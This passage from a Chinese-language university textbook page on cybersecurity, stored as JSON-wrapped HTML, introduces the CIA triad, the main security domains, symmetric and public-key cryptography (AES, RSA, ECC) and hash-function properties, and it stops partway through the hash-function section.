{"seq":3,"slug":"cybersecurity","title":"大学计算机科学与技术 — 网络安全","url":"/l-doc-books/education/university/engineering/computer-science/emerging-technologies/cybersecurity","wordCount":2485,"readingTime":10,"html":"<h1 id=\"大学计算机科学与技术-网络安全\">大学计算机科学与技术 — 网络安全</h1><h2 id=\"知识要点\">知识要点</h2><p>网络安全（Cybersecurity）是保护计算机系统、网络和数据免受未经授权的访问、破坏或窃取的学科。随着社会的全面数字化，网络安全已从纯技术问题上升为国家安全和企业生存的核心议题。2020 年代，勒索软件攻击造成的全球损失每年超过 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>200</mn></mrow><annotation encoding=\"application/x-tex\">200</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">200</span></span></span></span></span> 亿美元，供应链攻击（如 SolarWinds 事件）展示了即使是最高安全等级的组织也可能被入侵。</p>\n<p>网络安全的核心目标被概括为 <strong>CIA 三元组</strong>：<strong>机密性</strong>（Confidentiality）——确保信息仅对授权方可见；<strong>完整性</strong>（Integrity）——确保信息不被未授权修改；<strong>可用性</strong>（Availability）——确保授权用户在需要时能访问信息和资源。围绕这三个目标展开的攻防对抗，构成了网络安全的全部内容。</p>\n<table>\n<thead>\n<tr>\n<th>安全领域</th>\n<th>核心关注</th>\n<th>关键技术</th>\n<th>典型威胁</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>密码学</td>\n<td>数据机密性与完整性</td>\n<td>对称加密、公钥加密、哈希</td>\n<td>密码分析、量子威胁</td>\n</tr>\n<tr>\n<td>网络安全</td>\n<td>通信安全与边界防护</td>\n<td>防火墙、IDS/IPS、TLS</td>\n<td>DDoS、中间人攻击</td>\n</tr>\n<tr>\n<td>应用安全</td>\n<td>软件漏洞防护</td>\n<td>安全编码、渗透测试、WAF</td>\n<td>注入攻击、XSS、CSRF</td>\n</tr>\n<tr>\n<td>身份与访问管理</td>\n<td>认证与授权</td>\n<td>多因素认证、OAuth、零信任</td>\n<td>凭证窃取、权限提升</td>\n</tr>\n<tr>\n<td>运营安全</td>\n<td>检测、响应与恢复</td>\n<td>SIEM、SOC、事件响应</td>\n<td>APT、内部威胁</td>\n</tr>\n</tbody></table>\n<h2 id=\"详细讲解\">详细讲解</h2><h3 id=\"密码学基础\">密码学基础</h3><p>密码学是网络安全的数学基石。现代密码学的安全性基于<strong>计算困难性假设</strong>——攻击者在合理时间和算力下无法破解加密。</p>\n<p><strong>对称加密</strong>使用同一密钥 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>K</mi></mrow><annotation encoding=\"application/x-tex\">K</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.0715em;\">K</span></span></span></span></span> 进行加密和解密：<span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>E</mi><mi>K</mi></msub><mo stretchy=\"false\">(</mo><mi>M</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi>C</mi></mrow><annotation encoding=\"application/x-tex\">E_K(M) = C</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.0576em;\">E</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3283em;\"><span style=\"top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.0715em;\">K</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.109em;\">M</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.0715em;\">C</span></span></span></span></span>，<span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>D</mi><mi>K</mi></msub><mo stretchy=\"false\">(</mo><mi>C</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi>M</mi></mrow><annotation encoding=\"application/x-tex\">D_K(C) = M</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.0278em;\">D</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3283em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.0715em;\">K</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.0715em;\">C</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.109em;\">M</span></span></span></span></span>。</p>\n<table>\n<thead>\n<tr>\n<th>算法</th>\n<th>类型</th>\n<th>密钥长度</th>\n<th>块大小</th>\n<th>安全状态</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>AES</td>\n<td>块密码</td>\n<td>128/192/256 位</td>\n<td>128 位</td>\n<td>当前标准，安全</td>\n</tr>\n<tr>\n<td>ChaCha20</td>\n<td>流密码</td>\n<td>256 位</td>\n<td>—</td>\n<td>TLS 1.3 推荐，安全</td>\n</tr>\n<tr>\n<td>DES</td>\n<td>块密码</td>\n<td>56 位</td>\n<td>64 位</td>\n<td>已淘汰（暴力破解可行）</td>\n</tr>\n<tr>\n<td>3DES</td>\n<td>块密码</td>\n<td>168 位有效</td>\n<td>64 位</td>\n<td>逐步淘汰</td>\n</tr>\n</tbody></table>\n<p>AES 在 <strong>GCM 模式</strong>（Galois/Counter Mode）下同时提供加密和认证（AEAD），是当前最推荐的对称加密方案。GCM 的认证标签通过有限域 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>G</mi><mi>F</mi><mo stretchy=\"false\">(</mo><msup><mn>2</mn><mn>128</mn></msup><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">GF(2^{128})</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.0641em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.1389em;\">GF</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">128</span></span></span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></span> 上的多项式乘法计算，能检测密文的任何篡改。</p>\n<p><strong>公钥加密</strong>使用一对密钥——公钥 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">pk</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8889em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.0315em;\">k</span></span></span></span></span> 加密，私钥 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">sk</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6944em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.0315em;\">k</span></span></span></span></span> 解密。<strong>RSA</strong> 的安全性基于大整数分解困难：</p>\n<div class=\"math-block\"><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>n</mi><mo separator=\"true\">,</mo><mspace width=\"1em\"/><mi>m</mi><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">c = m^e \\bmod n, \\quad m = c^d \\bmod n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7144em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">m</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7144em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">e</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.0556em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">mod</span></span></span><span class=\"mspace\" style=\"margin-right:0.0556em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:1em;\"></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8991em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">c</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">d</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.0556em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">mod</span></span></span><span class=\"mspace\" style=\"margin-right:0.0556em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span></span></div><p>其中 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mi>q</mi></mrow><annotation encoding=\"application/x-tex\">n = pq</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.0359em;\">pq</span></span></span></span></span>（<span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi><mo separator=\"true\">,</mo><mi>q</mi></mrow><annotation encoding=\"application/x-tex\">p, q</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.0359em;\">q</span></span></span></span></span> 为大素数），<span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>e</mi><mo>⋅</mo><mi>d</mi><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width=\"0.4444em\"/><mo stretchy=\"false\">(</mo><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow><mspace width=\"0.3333em\"/><mi>ϕ</mi><mo stretchy=\"false\">(</mo><mi>n</mi><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">e \\cdot d \\equiv 1 \\pmod{\\phi(n)}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4445em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6944em;\"></span><span class=\"mord mathnormal\">d</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">≡</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">1</span><span class=\"mspace allowbreak\"></span><span class=\"mspace\" style=\"margin-right:0.4444em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathrm\">mod</span></span></span><span class=\"mspace\" style=\"margin-right:0.3333em;\"></span><span class=\"mord mathnormal\">ϕ</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">))</span></span></span></span></span>。知道 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span></span> 但不知道 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi><mo separator=\"true\">,</mo><mi>q</mi></mrow><annotation encoding=\"application/x-tex\">p, q</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.0359em;\">q</span></span></span></span></span> 时，无法高效计算 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>d</mi></mrow><annotation encoding=\"application/x-tex\">d</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6944em;\"></span><span class=\"mord mathnormal\">d</span></span></span></span></span>。当前推荐密钥长度 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo>≥</mo><mn>2048</mn></mrow><annotation encoding=\"application/x-tex\">\\geq 2048</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.7719em;vertical-align:-0.136em;\"></span><span class=\"mrel\">≥</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">2048</span></span></span></span></span> 位。</p>\n<p><strong>椭圆曲线密码学</strong>（ECC）基于椭圆曲线离散对数问题，在相同安全级别下密钥长度远短于 RSA（256 位 ECC <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo>≈</mo></mrow><annotation encoding=\"application/x-tex\">\\approx</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4831em;\"></span><span class=\"mrel\">≈</span></span></span></span></span> 3072 位 RSA），计算效率更高。Curve25519 是广泛使用的椭圆曲线，用于 TLS、Signal 协议和 WireGuard VPN。</p>\n<p><strong>哈希函数</strong> <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>H</mi></mrow><annotation encoding=\"application/x-tex\">H</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.0813em;\">H</span></span></span></span></span> 将任意长度输入映射为固定长度摘要，满足三个安全性质：</p>\n<ul>\n<li><strong>抗原像性</strong>：给定 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>h</mi></mrow><annotation encoding=\"application/x-tex\">h</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6944em;\"></span><span class=\"mord mathnormal\">h</span></span></span></span></span>，无法找到 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span></span> 使得 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>H</mi><mo stretchy=\"false\">(</mo><mi>m</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi>h</mi></mrow><annotation encoding=\"application/x-tex\">H(m) = h</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.0813em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">m</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6944em;\"></span><span class=\"mord mathnormal\">h</span></span></span></span></span></li>\n<li><strong>抗第二原像性</strong>：给定 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>m</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">m_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5806em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">m</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></span>，无法找到 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>m</mi><mn>2</mn></msub><mo mathvariant=\"normal\">≠</mo><msub><mi>m</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">m_2 \\neq m_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8889em;vertical-align:-0.1944em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">m</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\"><span class=\"mrel\"><span class=\"mord vbox\"><span class=\"thinbox\"><span class=\"rlap\"><span class=\"strut\" style=\"height:0.8889em;vertical-align:-0.1944em;\"></span><span class=\"inner\"><span class=\"mord\"><span class=\"mrel\"></span></span></span><span class=\"fix\"></span></span></span></span></span><span class=\"mspace nobreak\"></span><span class=\"mrel\">=</span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.5806em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">m</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></span> 使得 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>H</mi><mo stretchy=\"false\">(</mo><msub><mi>m</mi><mn>1</mn></msub><mo stretchy=\"false\">)</mo><mo>=</mo><mi>H</mi><mo stretchy=\"false\">(</mo><msub><mi>m</mi><mn>2</mn></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">H(m_1) = H(m_2)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.0813em;\">H</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">m</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.0813em;\">H</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">m</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></span></li>\n<li><strong>抗碰撞性</strong>：无法找到任意 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>m</mi><mn>1</mn></msub><mo mathvariant=\"normal\">≠</mo><msub><mi>m</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">m_1 \\neq m_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8889em;vertical-align:-0.1944em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">m</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\"><span class=\"mrel\"><span class=\"mord vbox\"><span class=\"thinbox\"><span class=\"rlap\"><span class=\"strut\" style=\"height:0.8889em;vertical-align:-0.1944em;\"></span><span class=\"inner\"><span class=\"mord\"><span class=\"mrel\"></span></span></span><span class=\"fix\"></span></span></span></span></span><span class=\"mspace nobreak\"></span><span class=\"mrel\">=</span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.5806em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">m</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></span> 使得 <span class=\"math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>H</mi><mo stretchy=\"false\">(</mo><msub><mi>m</mi><mn>1</mn></msub><mo stretchy=\"false\">)</mo><mo>=</mo><mi>H</mi><mo stretchy=\"false\">(</mo><msub><mi>m</mi><mn>2</mn></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">H(m_1) = H(m_2)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" 